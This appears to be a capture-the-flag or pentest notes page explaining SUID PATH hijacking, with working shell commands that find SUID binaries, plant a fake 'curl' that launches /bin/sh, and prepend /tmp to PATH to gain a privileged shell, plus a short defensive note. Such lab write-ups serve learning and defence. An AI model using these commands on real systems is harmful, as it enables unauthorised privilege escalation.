# SUID PATH Hijack

Used on: **Binex, Kenobi**

If a SUID binary calls external commands without absolute paths, control of `PATH` lets an attacker run a malicious replacement as the SUID user.

## Prerequisites

- SUID binary owned by a privileged user.
- Binary calls a command by name, not full path.
- Attacker can control `PATH` and place an executable earlier in it.

## Steps

Find SUID files and inspect strings:

```bash
find / -perm -u=s -type f 2>/dev/null
strings /usr/bin/menu
```

Create a malicious command replacement:

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## Defensive Note

Use absolute paths inside privileged binaries, drop privileges before executing helpers, and avoid SUID where capabilities or sudo rules are safer.

## Related

- [suid-binary-reversing.md](suid-binary-reversing.md)
- [../enumeration/linux-enumeration.md](../enumeration/linux-enumeration.md)


